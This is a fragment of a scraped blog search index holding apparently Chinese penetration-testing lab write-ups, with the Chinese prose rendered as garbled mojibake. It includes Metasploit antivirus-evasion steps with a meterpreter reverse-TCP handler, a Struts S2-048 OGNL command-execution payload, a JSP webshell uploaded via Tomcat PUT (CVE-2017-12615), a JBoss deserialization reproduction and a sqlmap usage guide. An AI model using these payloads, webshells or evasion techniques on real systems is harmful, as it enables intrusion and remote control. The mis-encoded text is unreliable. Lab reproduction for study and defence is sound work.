å¯ä»¥è¢«windowsé˜²ç«å¢™æ£€æµ‹åˆ°\nå°†æ­¤æ–‡ä»¶ä¸Šä¼ è¿›è¡Œæ£€æµ‹ https://www.virustotal.com/gui/home/upload\nè¢«æ£€æµ‹åˆ°çš„ç»“æœå°‘äº†è®¸å¤šï¼Œå…æ€æœ‰ä¸€å®šæ•ˆæœ\nshellcodeåŠ è½½å™¨ï¼ˆæœ¬æ¬¡å®éªŒå‘½åä¸ºms.exeï¼‰ æœ¬èº«ä¹Ÿç®—ä¸€ä¸ªæœ¨é©¬ç¨‹åºï¼Œå°†ms.exeä¸Šä¼ æ£€æµ‹ç»“æœå¦‚ä¸‹ï¼š\n2.4 å…æ€æœ¨é©¬åˆ©ç”¨ å¯åŠ¨msfç›‘å¬ç¨‹åº\nâ”Œâ”€â”€(rootã‰¿kali)-[~] â””â”€# msfconsole -q msf6 \u0026gt; use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) \u0026gt; set payload windows/meterpreter/reverse_tcp payload =\u0026gt; windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) \u0026gt; set lhost 172.31.5.9 lhost =\u0026gt; 172.31.5.9 msf6 exploit(multi/handler) \u0026gt; set lport 7777 lport =\u0026gt; 7777 msf6 exploit(multi/handler) \u0026gt; run [*] Started reverse TCP handler on 172.31.5.9:7777 å°†åŠ è½½å™¨ms.exeå’Œä¸Šæ–‡ç”Ÿæˆçš„æœ¨é©¬æ–‡ä»¶é˜²æ­¢åœ¨åŒä¸€ç›®å½•ä¸‹ï¼ˆIPï¼š172.31.5.1ï¼‰ï¼š\nåŒå‡»ms.exeï¼Œè§‚å¯Ÿåˆ°æˆåŠŸè·å–è¿œç¨‹æœºå™¨çš„å‘½ä»¤çª—å£\n","permalink":"https://senmer.github.io/zh/posts/tech/anti-virus/msf%E7%BC%96%E7%A0%81%E5%99%A8%E7%BB%93%E5%90%88shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80/","summary":"\u003cp\u003eMSFç¼–ç å™¨ç»“åˆshellcodeåŠ è½½å™¨è¿›è¡Œå…æ€å®éªŒ\u003c/p\u003e","title":"MSFç¼–ç å™¨ç»“åˆshellcodeåŠ è½½å™¨å®ç°å…æ€"},{"content":"JBoss 5.x/6.x ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2017-12149ï¼‰\n1 å®éªŒç¯å¢ƒ è½¯ä»¶åç§° ç‰ˆæœ¬ éƒ¨ç½²æ–¹å¼ IP JBoss jboss-6.1.0.Final docker run -d -p 8085:8080 \u0026ndash;name JBoss docker.io/hackingpub/cve-2017-12149 176.122.183.173 2 æ¼æ´åŸç† JBoss 5.x/6.x ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2017-12149ï¼‰\nè¯¥æ¼æ´ä¸º Javaååºåˆ—åŒ–é”™è¯¯ç±»å‹ï¼Œå­˜åœ¨äº Jboss çš„ HttpInvoker ç»„ä»¶ä¸­çš„ ReadOnlyAccessFilterè¿‡æ»¤ å™¨ä¸­ã€‚è¯¥è¿‡æ»¤å™¨åœ¨æ²¡æœ‰è¿›è¡Œä»»ä½•å®‰å…¨æ£€æŸ¥çš„æƒ…å†µä¸‹å°è¯•å°†æ¥è‡ªå®¢æˆ·ç«¯çš„æ•°æ®æµè¿›è¡Œååºåˆ—åŒ–ï¼Œä»è€Œå¯¼è‡´ äº†æ”»å‡»è€…å¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚\næ¼æ´å½±å“5.xå’Œ6.xç‰ˆæœ¬çš„JBossã€‚\nJBOSS Application Serveræ˜¯ä¸€ä¸ªåŸºäºJ2EEçš„å¼€æ”¾æºä»£ç çš„åº”ç”¨æœåŠ¡å™¨ã€‚ JBossä»£ç éµå¾ªLGPLè®¸å¯ï¼Œå¯ ä»¥åœ¨ä»»ä½•å•†ä¸šåº”ç”¨ä¸­å…è´¹ä½¿ç”¨ã€‚Javaåºåˆ—åŒ–ï¼šæŠŠJavaå¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—çš„è¿‡ç¨‹ã€‚Javaååºåˆ—åŒ–ï¼šæŒ‡æŠŠ å­—èŠ‚åºåˆ—æ¢å¤ä¸ºJavaå¯¹è±¡çš„è¿‡ç¨‹ã€‚ Javaåºåˆ—åŒ–ä¸ååºåˆ—åŒ–ä½œç”¨ï¼šä¾¿äºä¿å­˜æ•°æ®ï¼Œæˆ–è€…è¿›è¡Œæ•°æ®ä¼ è¾“ã€‚\næ¼æ´å‡ºç°åœ¨ Jboss çš„ HttpInvokerç»„ä»¶ä¸­çš„ ReadOnlyAccessFilter è¿‡æ»¤å™¨ä¸­ï¼Œæºç åœ¨ jboss\\server\\all\\deploy\\httpha-invoker.sar\\invoker.war\\WEBINF\\classes\\org\\jboss\\invocation\\http\\servletç›®å½•ä¸‹çš„ReadOnlyAccessFilter.classæ–‡ä»¶ä¸­ï¼Œå…¶ä¸­ doFilterå‡½æ•°ä»£ç æŸ¥çœ‹æ–¹å¼ :\ndocker exec -it JBoss bash -c \u0026#39;cat /jboss-6.1.0.Final/server/all/deploy/httpha-invoker.sar/invoker.war/WEB-INF/classes/org/jboss/invocation/http/servlet/ReadOnlyAccessFilter.class\u0026#39; 3 æ¼æ´å¤ç° å®‰è£…å¥½ç¯å¢ƒä¹‹åï¼Œç›´æ¥ä½¿ç”¨jbossååºåˆ—åŒ–å·¥å…·æ‰“å¼€ï¼ŒæˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚\n","permalink":"https://senmer.github.io/zh/posts/tech/cve/jboss-5.x6.x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2017-12149%E5%A4%8D%E7%8E%B0/","summary":"\u003cp\u003eJBoss 5.x/6.x ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2017-12149ï¼‰\u003c/p\u003e","title":"JBoss 5.x\u00266.x ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE 2017 12149ï¼‰å¤ç°"},{"content":"S2-048 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-9791ï¼‰\n1 å®éªŒç¯å¢ƒ è½¯ä»¶åç§° ç‰ˆæœ¬ éƒ¨ç½²æ–¹å¼ IP Apache Struts latest docker run -d -p 8084:8080 \u0026ndash;name apache-struts docker.io/piesecurity/apache-struts2-cve-2017-5638 172.31.5.7 2 æ¼æ´å¤ç° æ‰“å¼€é“¾æ¥ï¼š\nhttp://172.31.5.7:8084/integration/editGangster;jsessionid=768AAC20493D6CD33F9DF8EF6357FAFD æ¼æ´å­˜åœ¨ç‚¹ï¼š\nåœ¨Gangster Nameè¾“å…¥è¡¨è¾¾å¼ï¼Œå…¶å®ƒä½ç½®ä»»æ„å¡«å†™\n${2*2} å‘ç°è¡¨è¾¾å¼æˆåŠŸæ‰§è¡Œ\nå‡†å¤‡ä»¥ä¸‹POCå¡«å…¥è¡¨å•\n%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess? (#_memberAccess=#dm): ((#container=#context[\u0026#39;com.opensymphony.xwork2.ActionContext.container\u0026#39;]). (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)) .(#ognlUtil.getExcludedPackageNames().clear()). (#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))). (#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec (\u0026#39;id\u0026#39;).getInputStream())).(#q)} #id è¿”å›å½“å‰ç”¨æˆ·çš„ä¿¡æ¯ æˆåŠŸè·å–åˆ°å½“å‰ç”¨æˆ·çš„ä¿¡æ¯\n3 æ¼æ´åŸç† å½±å“ç‰ˆæœ¬: 2.0.0 - 2.3.32\nå‚è€ƒé“¾æ¥ï¼šStruts S2-048 RCEæ¼æ´åˆ†æ - é‘„åŠå¸« - åšå®¢å›­ (cnblogs.com)\n","permalink":"https://senmer.github.io/zh/posts/tech/cve/apache%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2017-9791/","summary":"\u003cp\u003eS2-048 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-9791ï¼‰\u003c/p\u003e","title":"S2-048 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-9791ï¼‰"},{"content":"Tomcat PUTæ–¹æ³•ä»»æ„å†™æ–‡ä»¶æ¼æ´ï¼ˆCVE-2017-12615ï¼‰å¤ç°\n1 å®éªŒç¯å¢ƒ è½¯ä»¶åç§° ç‰ˆæœ¬ éƒ¨ç½²æ–¹å¼ IP cve-2017-12615 latest docker run -d -p 8083:8080 \u0026ndash;name tomcat-cve docker.io/cved/cve-2017-12615 172.31.5.7 2 æ¼æ´å¤ç° å¼€å¯burpæŠ“åŒ…ï¼Œè®¿é—® 172.31.5.7:8083\nä½¿ç”¨repeater æ¨¡å—ä¿®æ”¹æ•°æ®åŒ…ï¼Œæ•°æ®åŒ…å†…å®¹å¦‚ä¸‹ï¼š\n\u0026lt;% if(\u0026#34;user\u0026#34;.equals(request.getParameter(\u0026#34;pwd\u0026#34;))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\u0026#34;p\u0026#34;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\u0026#34;\u0026lt;pre\u0026gt;\u0026#34;); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\u0026#34;\u0026lt;/pre\u0026#34;); } %\u0026gt; å‘é€ä¿®æ”¹åçš„æ•°æ®åŒ…ï¼Œè¿”å›çŠ¶æ€ç ä¸º204ï¼Œè¡¨ç¤ºæˆåŠŸå†™å…¥ä¸€ä¸ªshell.jspæ–‡ä»¶è‡³æœåŠ¡å™¨\næ³¨æ„ï¼štomcatæœ¬èº«ä¸å…è®¸ä¸Šä¼ *.jspæ–‡ä»¶ï¼Œå› æ­¤è¯·æ±‚å¤´è¡Œä¿®æ”¹ä¸º/shell.jsp/\nè¯¥è¯·æ±‚åˆ°æœåŠ¡å™¨åï¼Œæ–‡ä»¶åä¸å…è®¸æœ‰/ï¼Œ/è¢«ä¸¢å¼ƒã€‚å› æ­¤æœ€ç»ˆç”Ÿæˆæ–‡ä»¶åä¸ºshell.jsp\nä½¿ç”¨æµè§ˆå™¨è®¿é—®è¯¥ç¨‹åºï¼ŒæˆåŠŸæ‰§è¡Œå‘½ä»¤pwdï¼ˆä»»æ„å‘½ä»¤å‡å¯ï¼‰\nhttp://172.31.5.7:8083/shell.jsp?pwd=user\u0026amp;p=pwd 3 æ¼æ´åŸç† è¯¥æ¼æ´ä¸»è¦æ˜¯å› ä¸ºtomcatçš„web.xmlé…ç½®æ–‡ä»¶ä¸­çš„readonlyå‚æ•°å€¼ä¸ºfalseï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥é€šè¿‡PUTæ–¹æ³•å†™å…¥æ–‡ä»¶\ndocker exec -it tomcat-cve bash -c \u0026#34;grep -A 2 readon conf/web.xml\u0026#34; æ‰€ä»¥ä¿®å¤è¯¥æ¼æ´çš„æ–¹å¼ä¹Ÿç®€å•ï¼Œå°†readonlyçš„å€¼è®¾ç½®ä¸ºtrueå³å¯\næ¼æ´å½±å“ç‰ˆæœ¬ï¼šTomcat 7.0.0-7.0.79ã€8.5.19\n","permalink":"https://senmer.github.io/zh/posts/tech/cve/tomcat%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2017-12615/","summary":"\u003cp\u003eTomcat PUTæ–¹æ³•ä»»æ„å†™æ–‡ä»¶æ¼æ´ï¼ˆCVE-2017-12615ï¼‰å¤ç°\u003c/p\u003e","title":"Tomcatä»»æ„å†™æ–‡ä»¶æ¼æ´å¤ç°(CVE-2017-12615)"},{"content":"1 å®éªŒç¯å¢ƒ è½¯ä»¶åç§° ç‰ˆæœ¬ éƒ¨ç½²æ–¹å¼ IP SQLmap latest æºç éƒ¨ç½² 172.31.5.7 DVWA latest docker run -d -p 80:80 \u0026ndash;name dvwa docker.io/sagikazarmark/dvwa 172.31.5.7 2 SQLmapç®€ä»‹ å®˜æ–¹ç½‘ç«™ï¼šhttp://sqlmap.org/ï¼Œ ä¸‹è½½åœ°å€ï¼šhttps://github.com/sqlmapproject/sqlmap/zipball/master\nSqlmapæ˜¯ä¸€æ¬¾å¼€æºçš„æ¸—é€æµ‹è¯•å·¥å…·ï¼Œå¯ä»¥è‡ªåŠ¨æ£€æµ‹å’Œåˆ©ç”¨SQLæ³¨å…¥æ¼æ´ä»¥åŠæ¥å…¥è¯¥æ•°æ®åº“çš„æœåŠ¡å™¨ã€‚å®ƒæ‹¥æœ‰éå¸¸å¼ºå¤§çš„æ£€æµ‹å¼•æ“ã€å…·æœ‰å¤šç§ç‰¹æ€§çš„æ¸—é€æµ‹è¯•å™¨ã€é€šè¿‡æ•°æ®åº“æŒ‡çº¹æå–è®¿é—®åº•å±‚æ–‡ä»¶ç³»ç»Ÿå¹¶é€šè¿‡å¤–å¸¦è¿æ¥æ‰§è¡Œå‘½ä»¤ã€‚\nsqlmapæ”¯æŒçš„æ•°æ®åº“æœ‰ï¼š\nMySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybaseå’ŒSAP MaxDB sqlmapæ”¯æŒäº”ç§ä¸åŒçš„æ³¨å…¥æ¨¡å¼ï¼š\n1ã€åŸºäºå¸ƒå°”çš„ç›²æ³¨ï¼Œå³å¯ä»¥æ ¹æ®è¿”å›é¡µé¢åˆ¤æ–­æ¡ä»¶çœŸå‡çš„æ³¨å…¥ã€‚ 2ã€åŸºäºæ—¶é—´çš„ç›²æ³¨ï¼Œå³ä¸èƒ½æ ¹æ®é¡µé¢è¿”å›å†…å®¹åˆ¤æ–­ä»»ä½•ä¿¡æ¯ï¼Œç”¨æ¡ä»¶è¯­å¥æŸ¥çœ‹æ—¶é—´å»¶è¿Ÿè¯­å¥æ˜¯å¦æ‰§è¡Œï¼ˆå³é¡µ é¢è¿”å›æ—¶é—´æ˜¯å¦å¢åŠ ï¼‰æ¥åˆ¤æ–­ã€‚ 3ã€åŸºäºæŠ¥é”™æ³¨å…¥ï¼Œå³é¡µé¢ä¼šè¿”å›é”™è¯¯ä¿¡æ¯ï¼Œæˆ–è€…æŠŠæ³¨å…¥çš„è¯­å¥çš„ç»“æœç›´æ¥è¿”å›åœ¨é¡µé¢ä¸­ã€‚ 4ã€è”åˆæŸ¥è¯¢æ³¨å…¥ï¼Œå¯ä»¥ä½¿ç”¨unionçš„æƒ…å†µä¸‹çš„æ³¨å…¥ã€‚ 5ã€å †æŸ¥è¯¢æ³¨å…¥ï¼Œå¯ä»¥åŒæ—¶æ‰§è¡Œå¤šæ¡è¯­å¥çš„æ‰§è¡Œæ—¶çš„æ³¨å…¥ã€‚ 2 ä¸‹è½½åŠå®‰è£… 2.1 Linux git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap cd sqlmap python sqlmap.py --update # æ›´æ–° python sqlmap.py -hh # æŸ¥çœ‹å¸®åŠ©ä¿¡æ¯ 2.2 windows å®˜ç½‘ä¸‹è½½sqlmapçš„å‹ç¼©åŒ…ï¼Œè§£å‹åå³å¯ä½¿ç”¨ã€‚ä½†éœ€è¦ä¸€äº›ç»„ä»¶åŒ…çš„æ”¯æŒï¼Œéœ€è¦æœ‰python2.7.xæˆ–è€…2.6.xç¯å¢ƒæ”¯æŒã€‚\n2.2. kali é»˜è®¤å®‰è£…ï¼ˆè‡ªå¸¦ï¼‰\nâ”Œâ”€â”€(rootã‰¿kali)-[~] â””â”€# sqlmap --version 1.6.11#stable 3 å‚æ•°è¯¦è§£ 3.1 Targetï¼šç›®æ ‡ -u URL, --url=URL ç›®æ ‡URL (e.g.\u0026#34;http://www.site.com/vuln.php?id=1\u0026#34;)ï¼Œä½¿ç”¨-uæˆ–è€…--url -d DIRECT ç›´æ¥è¿æ¥æ•°æ®åº“çš„è¿æ¥å­—ç¬¦ä¸² -l LOGFILE ä»Burpæˆ–è€…WebScarabä»£ç†æ—¥å¿—æ–‡ä»¶ä¸­åˆ†æç›®æ ‡ -x SITEMAPURL ä»è¿œç¨‹ç½‘ç«™åœ°å›¾ï¼ˆsitemap.xmlï¼‰æ–‡ä»¶æ¥è§£æç›®æ ‡ -m BULKFILE å°†ç›®æ ‡åœ°å€ä¿å­˜åœ¨æ–‡ä»¶ä¸­ï¼Œä¸€è¡Œä¸ºä¸€ä¸ªURLåœ°å€è¿›è¡Œæ‰¹é‡æ£€æµ‹ã€‚ -g GOOGLEDORK ä»è°·æ­Œä¸­åŠ è½½ç»“æœç›®æ ‡URLï¼ˆåªè·å–å‰100ä¸ªç»“æœï¼Œéœ€è¦æŒ‚ä»£ç†ï¼‰ -c CONFIGFILE ä»é…ç½®iniæ–‡ä»¶ä¸­åŠ è½½é€‰é¡¹ -r REQUESTFILE ä»æ–‡ä»¶åŠ è½½HTTPè¯·æ±‚ï¼Œsqlmapå¯ä»¥ä»ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ä¸­è·å–HTTPè¯·æ±‚ï¼Œè¿™æ ·å°±å¯ ä»¥è·³è¿‡è®¾ç½®ä¸€äº›å…¶ä»–å‚æ•°ï¼ˆæ¯”å¦‚cookieï¼ŒPOSTæ•°æ®ï¼Œç­‰ç­‰ï¼‰ï¼Œè¯·æ±‚æ˜¯HTTPSçš„æ—¶éœ€è¦é…åˆè¿™ä¸ª--forcesslå‚æ•°æ¥ä½¿ç”¨ï¼Œæˆ–è€…å¯ä»¥åœ¨Hostå¤´åé—¨åŠ ä¸Š:443 ç›®æ ‡URL å‚æ•°ï¼š-uæˆ–è€…\u0026ndash;url æ ¼å¼ï¼šhttp(s)://targeturl[:port]/[â€¦] ä¾‹å¦‚ï¼špython sqlmap.py -u \u0026ldquo;http://www.target.com/vuln.php?id=1\u0026quot; -f \u0026ndash;banner \u0026ndash;dbs \u0026ndash;users\nä»æ–‡æœ¬ä¸­è·å–å¤šä¸ªç›®æ ‡æ‰«æ\nå‚æ•°ï¼š-m\næ–‡ä»¶ä¸­ä¿å­˜urlæ ¼å¼å¦‚ä¸‹ï¼Œsqlmapä¼šä¸€ä¸ªä¸€ä¸ªæ£€æµ‹\nwww.test1.com/vuln1.php?q=student www.test2.com/vuln2.asp?id=1 www.test3.com/vuln3/id/1* ä»æ–‡ä»¶ä¸­åŠ è½½HTTPè¯·æ±‚\nå‚æ•°ï¼š-r\nsqlmapå¯ä»¥ä»ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ä¸­è·å–HTTPè¯·æ±‚ï¼Œè¿™æ ·å°±å¯ä»¥è·³è¿‡è®¾ç½®ä¸€äº›å…¶ä»–å‚æ•°ï¼ˆæ¯”å¦‚cookieï¼ŒPOSTæ•°æ®ï¼Œç­‰ç­‰ï¼‰ã€‚ æ¯”å¦‚æ–‡æœ¬æ–‡ä»¶å†…å¦‚ä¸‹ï¼š\nPOST/students.php HTTP/1.1 Host:www.magedu.com User-Agent:Mozilla/4.0 id=1 å½“è¯·æ±‚æ˜¯HTTPSçš„æ—¶å€™ï¼Œéœ€è¦é…åˆ\u0026ndash;force-sslå‚æ•°æ¥ä½¿ç”¨ï¼Œæˆ–è€…å¯ä»¥åœ¨Hostå¤´åé¢åŠ ä¸Š:443\n3.2 Requestï¼šè¯·æ±‚è®¾ç½® --methodï¼šæŒ‡å®šè¯·æ±‚æ–¹æ³• --dataï¼šæŠŠæ•°æ®ä»¥POSTæ–¹å¼æäº¤ --paramï¼šå½“GETæˆ–POSTçš„æ•°æ®éœ€è¦ç”¨å…¶ä»–å­—ç¬¦åˆ†å‰²æµ‹è¯•å‚æ•°çš„æ—¶å€™éœ€è¦ç”¨åˆ°æ­¤å‚æ•° --cookieï¼šè®¾ç½®cookieï¼Œæäº¤è¯·æ±‚çš„æ—¶å€™é™„å¸¦æ‰€è®¾ç½®çš„cookie --load-cookiesï¼šä»æ–‡ä»¶è·å–cookie --user-agentï¼šå¯ä»¥ä½¿ç”¨â€“user-angetå‚æ•°æ¥ä¿®æ”¹ --headersï¼šå¯ä»¥é€šè¿‡â€“headerså‚æ•°æ¥å¢åŠ é¢å¤–çš„httpå¤´ --proxyï¼šè®¾ç½®ä»£ç†ï¼Œå¯ä»¥é¿å…æœ¬æœºåœ°å€è¢«å°ç¦ --delayï¼šå¯ä»¥è®¾å®šä¸¤ä¸ªHTTP(S)è¯·æ±‚é—´çš„å»¶è¿Ÿ é˜²æ­¢å‘é€è¿‡å¿«å¯¼è‡´è¢«å°ip --random-agentï¼šä½¿ç”¨â€“random-agnetå‚æ•°æ¥éšæœºçš„ä»./txt/user-agents.txtä¸­è·å–ã€‚å½“â€“levelå‚æ•°è®¾å®šä¸º3æˆ–è€…3ä»¥ä¸Šçš„æ—¶å€™ï¼Œä¼šå°è¯•å¯¹User-Angentè¿›è¡Œæ³¨å…¥ã€‚ --refererï¼šåœ¨è¯·æ±‚ç›®æ ‡çš„æ—¶å€™å¯ä»¥è‡ªå·±ä¼ªé€ è¯·æ±‚åŒ…ä¸­çš„referer â€“-levelå‚æ•°è®¾å®šä¸º3æˆ–è€…3ä»¥ä¸Šçš„æ—¶å€™ä¼šå°è¯•å¯¹refereræ³¨å…¥ã€‚ å‚æ•°ï¼š\u0026ndash;data\næ­¤å‚æ•°æ˜¯æŠŠæ•°æ®ä»¥POSTæ–¹å¼æäº¤ï¼Œsqlmapä¼šåƒæ£€æµ‹GETå‚æ•°ä¸€æ ·æ£€æµ‹POSTå‚æ•°ã€‚\npython sqlmap.py -u \u0026#34;http://www.magedu.com/students.php\u0026#34; --data=\u0026#34;id=1\u0026#34; -f --banner --dbs --users åˆ©ç”¨æ­£åˆ™è¿‡æ»¤ç›®æ ‡ç½‘å€\nå‚æ•°ï¼š\u0026ndash;scope\npython sqlmap.py -l burp_http.log --scope=\u0026#34;(www)?\\.target\\.(com|net|org)\u0026#34; é¿å…è¿‡å¤šçš„é”™è¯¯è¯·æ±‚è¢«å±è”½\nå‚æ•°ï¼š\u0026ndash;safe-url,\u0026ndash;safe-freq\næœ‰çš„webåº”ç”¨ç¨‹åºä¼šåœ¨ä½ å¤šæ¬¡è®¿é—®é”™è¯¯çš„è¯·æ±‚æ—¶å±è”½æ‰ä½ ä»¥åçš„æ‰€æœ‰è¯·æ±‚ï¼Œè¿™æ ·åœ¨sqlmapè¿›è¡Œæ¢æµ‹æˆ–è€…æ³¨å…¥çš„æ—¶å€™å¯èƒ½é€ æˆé”™è¯¯è¯·æ±‚è€Œè§¦å‘è¿™ä¸ªç­–ç•¥ï¼Œå¯¼è‡´åç»­æ— æ³•è¿›è¡Œæµ‹è¯•ã€‚ ç»•è¿‡è¿™ä¸ªç­–ç•¥æœ‰ä¸¤ç§æ–¹å¼ï¼š\n--safe-urlï¼šæä¾›ä¸€ä¸ªå®‰å…¨ä¸é”™è¯¯çš„è¿æ¥ï¼Œæ¯éš”ä¸€æ®µæ—¶é—´éƒ½ä¼šå»è®¿é—®ä¸€ä¸‹ã€‚ --safe-freqï¼šæä¾›ä¸€ä¸ªå®‰å…¨ä¸é”™è¯¯çš„è¿æ¥ï¼Œæ¯æ¬¡æµ‹è¯•è¯·æ±‚ä¹‹åéƒ½ä¼šå†è®¿é—®ä¸€éå®‰å…¨è¿æ¥ã€‚ 3.3 Optimizationï¼šä¼˜åŒ– -o å¼€å¯æ‰€æœ‰ä¼˜åŒ–å¼€å…³ 3.4 Injectionï¼šæ³¨å…¥ -pï¼šè®¾ç½®æƒ³è¦æµ‹è¯•çš„å‚æ•° --skipï¼šä¸æƒ³è¦æµ‹è¯•çš„å‚æ•°å¯ä»¥é€šè¿‡ skipè®¾ç½®è·³è¿‡ --dbmsï¼šæŒ‡å®šæ•°æ®åº“ èŠ‚çœsqlmapè‡ªå·±æ£€æµ‹çš„æ—¶é—´ --osï¼šæŒ‡å®šæ•°æ®åº“æœåŠ¡ç³»ç»Ÿ èŠ‚çœsqlmapè‡ªå·±æ£€æµ‹çš„æ—¶é—´ --tamperï¼šä½¿ç”¨sqlmapè‡ªå¸¦çš„tamperï¼ˆè„šæœ¬ï¼‰ï¼Œæˆ–è€…è‡ªå·±å†™çš„tamperï¼Œæ¥æ··æ·†payloadï¼Œé€šå¸¸ç”¨æ¥ç»•è¿‡wafå’Œips æµ‹è¯•å‚æ•°\nå‚æ•°ï¼š-p, \u0026ndash;skip\nsqlmapé»˜è®¤æµ‹è¯•æ‰€æœ‰çš„GETå’ŒPOSTå‚æ•°ï¼Œå½“\u0026ndash;levelçš„å€¼å¤§äºç­‰äº2çš„æ—¶å€™ä¹Ÿä¼šæµ‹è¯•HTTP Cookieå¤´çš„å€¼ï¼Œå½“å¤§äºç­‰äº3çš„æ—¶å€™ä¹Ÿä¼šæµ‹è¯•User-Agentå’ŒHTTP Refererå¤´çš„å€¼ã€‚ä½†æ˜¯ä½ å¯ä»¥æ‰‹åŠ¨ç”¨-på‚æ•°è®¾ç½®æƒ³è¦æµ‹è¯•çš„å‚æ•°ã€‚\n-p \u0026#34;id,user-anget\u0026#34; å½“ä½ ä½¿ç”¨\u0026ndash;levelçš„å€¼å¾ˆå¤§ä½†æ˜¯æœ‰ä¸ªåˆ«å‚æ•°ä¸æƒ³æµ‹è¯•çš„æ—¶å€™å¯ä»¥ä½¿ç”¨\u0026ndash;skipå‚æ•°ã€‚\n--skip=\u0026#34;user-agent,referer\u0026#34; åœ¨æœ‰äº›æ—¶å€™webæœåŠ¡å™¨ä½¿ç”¨äº†ä¼ªé™æ€ï¼Œå¯¼è‡´æ— æ³•ç›´æ¥ä½¿ç”¨sqlmapæµ‹è¯•å‚æ•°ï¼Œå¯ä»¥åœ¨æƒ³æµ‹è¯•çš„å‚æ•°åé¢åŠ * sqlmapå°†ä¼šæµ‹è¯•value1çš„ä½ç½®æ˜¯å¦å¯æ³¨å…¥ã€‚\npython sqlmap.py -u \u0026#34;http://magedu/param1/value1*/param2/value2/\u0026#34; æŒ‡å®šæ•°æ®åº“æœåŠ¡å™¨ç³»ç»Ÿ\nå‚æ•°ï¼š\u0026ndash;os é»˜è®¤æƒ…å†µä¸‹sqlmapä¼šè‡ªåŠ¨çš„æ¢æµ‹æ•°æ®åº“æœåŠ¡å™¨ç³»ç»Ÿï¼Œæ”¯æŒçš„ç³»ç»Ÿæœ‰ï¼šLinuxã€Windowsã€‚\n3.5 Detectionï¼šæ¢æµ‹ç­‰çº§ --level=LEVEL æ‰§è¡Œæµ‹è¯•çš„ç­‰çº§ï¼ˆ1-5ï¼Œé»˜è®¤ä¸º1ï¼‰ --riskï¼šï¼ˆ*æ…ç”¨æ­¤å‚æ•°æœ‰é£é™©ï¼‰ï¼Œ å…±æœ‰å››ä¸ªé£é™©ç­‰çº§ï¼ˆ0-3ï¼‰ï¼Œé»˜è®¤æ˜¯1ä¼šæµ‹è¯•å¤§éƒ¨åˆ†çš„æµ‹è¯•è¯­å¥ï¼Œ2ä¼šå¢åŠ åŸºäºäº‹ä»¶çš„æµ‹è¯•è¯­å¥ï¼Œ3ä¼šå¢åŠ ORè¯­å¥çš„SQLæ³¨å…¥æµ‹è¯•ã€‚ æ¢æµ‹ç­‰çº§\nå‚æ•°ï¼š\u0026ndash;level å…±æœ‰äº”ä¸ªç­‰çº§ï¼Œé»˜è®¤ä¸º1ï¼Œæœ€å¤§ä¸º5ï¼Œsqlmapä½¿ç”¨çš„payloadå¯ä»¥åœ¨xml/payloads.xmlä¸­çœ‹åˆ°ï¼Œä½ ä¹Ÿå¯ä»¥æ ¹æ®ç›¸åº”çš„æ ¼å¼æ·»åŠ è‡ªå·±çš„payloadã€‚\nè¿™ä¸ªå‚æ•°ä¸ä»…å½±å“ä½¿ç”¨å“ªäº›payloadï¼ŒåŒæ—¶ä¹Ÿä¼šå½±å“æµ‹è¯•çš„æ³¨å…¥ç‚¹ï¼ŒGETå’ŒPOSTçš„æ•°æ®éƒ½ä¼šæµ‹è¯•ï¼ŒHTTP Cookieåœ¨levelä¸º2çš„æ—¶å€™å°±ä¼šæµ‹è¯•ï¼ŒHTTP User-gent/Refererå¤´åœ¨levelä¸º3çš„æ—¶å€™å°±ä¼šæµ‹è¯•ã€‚\næ€»ä¹‹åœ¨ä½ ä¸ç¡®å®šå“ªä¸ªpayloadæˆ–è€…å‚æ•°ä¸ºæ³¨å…¥ç‚¹çš„æ—¶å€™ï¼Œä¸ºäº†ä¿è¯å…¨é¢æ€§ï¼Œå»ºè®®ä½¿ç”¨é«˜çš„levelå€¼ã€‚\n**é£é™©ç­‰çº§ **\nå‚æ•°ï¼š\u0026ndash;risk\nå…±æœ‰å››ä¸ªé£é™©ç­‰çº§ï¼Œé»˜è®¤æ˜¯1ä¼šæµ‹è¯•å¤§éƒ¨åˆ†çš„æµ‹è¯•è¯­å¥ï¼Œ2ä¼šå¢åŠ åŸºäºäº‹ä»¶çš„æµ‹è¯•è¯­å¥ï¼Œ3ä¼šå¢åŠ 